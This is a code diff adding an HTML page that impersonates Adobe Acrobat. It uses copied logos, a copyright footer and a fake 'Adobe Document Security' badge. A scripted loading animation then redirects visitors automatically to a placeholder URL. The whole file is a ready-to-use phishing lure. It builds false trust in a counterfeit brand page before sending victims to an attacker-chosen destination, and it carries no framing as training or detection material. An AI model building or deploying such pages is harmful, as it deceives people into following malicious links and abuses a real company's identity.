@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adobe Acrobat - Loading Document</title>
+    <link rel="icon" href="https://www.adobe.com/favicon.ico">
+    <style>
+        @page { size: A4; margin: 0; }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: adobe-clean, 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Top bar */
+        .topbar {
+            background: #2c2c2c;
+            padding: 14px 28px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .topbar svg {
+            width: 28px;
+            height: 24px;
+        }
+
+        .topbar-text {
+            color: #ffffff;
+            font-size: 15px;
+            font-weight: 700;
+        }
+
+        /* Main */
+        .main {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 48px 20px;
+        }
+
+        .card {
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 2px 24px rgba(0, 0, 0, 0.06);
+            max-width: 440px;
+            width: 100%;
+            padding: 56px 40px;
+            text-align: center;
+        }
+
+        /* Adobe logo mark */
+        .logo-mark {
+            width: 56px;
+            height: 48px;
+            margin: 0 auto 28px;
+        }
+
+        .card h2 {
+            font-size: 20px;
+            font-weight: 700;
+            color: #2c2c2c;
+            margin-bottom: 12px;
+        }
+
+        .card p {
+            font-size: 14px;
+            color: #6e6e6e;
+            line-height: 1.6;
+            margin-bottom: 32px;
+        }
+
+        /* Spinner */
+        .spinner-area {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .spinner {
+            width: 36px;
+            height: 36px;
+            border: 3px solid #f0f0f0;
+            border-top-color: #EB1000;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .spinner-text {
+            font-size: 13px;
+            color: #8a8a8a;
+        }
+
+        /* Progress bar */
+        .progress-track {
+            width: 100%;
+            max-width: 240px;
+            height: 3px;
+            background: #eeeeee;
+            border-radius: 2px;
+            overflow: hidden;
+            margin-top: 4px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #EB1000, #ff6b5e);
+            border-radius: 2px;
+            animation: load 3s ease-in-out forwards;
+        }
+
+        @keyframes load {
+            0% { width: 0%; }
+            30% { width: 25%; }
+            60% { width: 60%; }
+            90% { width: 90%; }
+            100% { width: 100%; }
+        }
+
+        .security-line {
+            margin-top: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 11px;
+            color: #b3b3b3;
+        }
+
+        .security-line svg {
+            width: 13px;
+            height: 13px;
+            fill: #b3b3b3;
+        }
+
+        /* Footer */
+        .footer {
+            padding: 18px;
+            text-align: center;
+            font-size: 11px;
+            color: #b3b3b3;
+        }
+
+        .footer a { color: #b3b3b3; text-decoration: none; }
+        .footer a:hover { text-decoration: underline; }
+
+        /* Print / PDF styles */
+        @media print {
+            body { background: #ffffff; }
+            .topbar { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+            .card { box-shadow: none; border: 1px solid #e0e0e0; }
+            .spinner { animation: none; border-top-color: #EB1000; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+            .progress-fill { width: 50%; animation: none; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+        }
+    </style>
+</head>
+<body>
+    <!-- Top bar -->
+    <div class="topbar">
+        <svg viewBox="0 0 30 26" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M11.5 0H0V26L11.5 0Z" fill="#EB1000"/>
+            <path d="M18.5 0H30V26L18.5 0Z" fill="#EB1000"/>
+            <path d="M15 9.6L22.1 26H17.5L15.3 20.5H10L15 9.6Z" fill="#EB1000"/>
+        </svg>
+        <span class="topbar-text">Adobe Acrobat</span>
+    </div>
+
+    <!-- Main -->
+    <div class="main">
+        <div class="card">
+            <svg class="logo-mark" viewBox="0 0 56 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M21.5 0H0V48L21.5 0Z" fill="#EB1000"/>
+                <path d="M34.5 0H56V48L34.5 0Z" fill="#EB1000"/>
+                <path d="M28 17.7L41.2 48H32.6L28.6 38H18.7L28 17.7Z" fill="#EB1000"/>
+            </svg>
+
+            <h2>Preparing your document</h2>
+            <p>Your PDF is being loaded securely. You will be redirected automatically.</p>
+
+            <div class="spinner-area">
+                <div class="spinner"></div>
+                <span class="spinner-text" id="statusText">Loading document...</span>
+                <div class="progress-track">
+                    <div class="progress-fill"></div>
+                </div>
+            </div>
+
+            <div class="security-line">
+                <svg viewBox="0 0 24 24"><path d="M12 2L3 7v5c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z"/></svg>
+                Secured with Adobe Document Security
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        &copy; 2026 Adobe. All rights reserved. &middot;
+        <a href="#">Privacy</a> &middot;
+        <a href="#">Terms of Use</a>
+    </div>
+
+    <script>
+        // Pure redirect — no action button needed
+        var statusEl = document.getElementById('statusText');
+
+        setTimeout(function() {
+            statusEl.textContent = 'Verifying document...';
+        }, 1000);
+
+        setTimeout(function() {
+            statusEl.textContent = 'Almost ready...';
+        }, 2200);
+
+        setTimeout(function() {
+            statusEl.textContent = 'Redirecting...';
+            window.location.href = 'REDIRECT_URL_HERE';
+        }, 3200);
+    </script>
+</body>
+</html>
